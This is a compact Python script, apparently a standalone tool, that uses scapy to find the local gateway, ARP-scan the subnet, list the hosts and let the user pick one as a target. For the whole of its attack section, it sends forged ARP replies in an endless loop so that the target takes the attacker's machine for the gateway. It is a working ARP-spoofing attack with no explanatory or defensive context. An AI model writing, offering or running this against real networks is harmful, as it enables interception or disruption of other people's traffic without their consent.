import sys, subprocess
import scapy.all as s

def main():
    try: g = s.conf.route.route("0.0.0.0")[2]
    except:
        try:
            g = [l.split(":")[1].strip() for l in subprocess.check_output("ipconfig", shell=True).decode(errors="ignore").split('\n') if "Default Gateway" in l and len(l.split(":")) > 1][0]
        except: g = "192.168.1.1"

    print(f"gateway: {g}")
    subnet = ".".join(g.split('.')[:3]) + ".0/24"
    print(f"scanning {subnet}...")
    
    ans, _ = s.srp(s.Ether(dst="ff:ff:ff:ff:ff:ff")/s.ARP(pdst=subnet), timeout=2, verbose=0)
    targets = [(r.psrc, r.hwsrc) for _, r in ans if r.psrc != g]
    
    if not targets: sys.exit("no targets found")
    
    my_ip = s.get_if_addr(s.conf.iface)

    for i, (ip, mac) in enumerate(targets):
        tag = " [me]" if ip == my_ip else ""
        print(f"[{i}] {ip} ({mac}){tag}")
    
    try: t, m = targets[int(input("select target: "))]
    except: sys.exit("bad choice")
    
    print(f"spoofing {t}...")
    try: s.sendp(s.Ether(dst=m)/s.ARP(op=2, pdst=t, hwdst=m, psrc=g), inter=2, loop=1, verbose=0)
    except KeyboardInterrupt: print("\nstopped")

if __name__ == "__main__": main()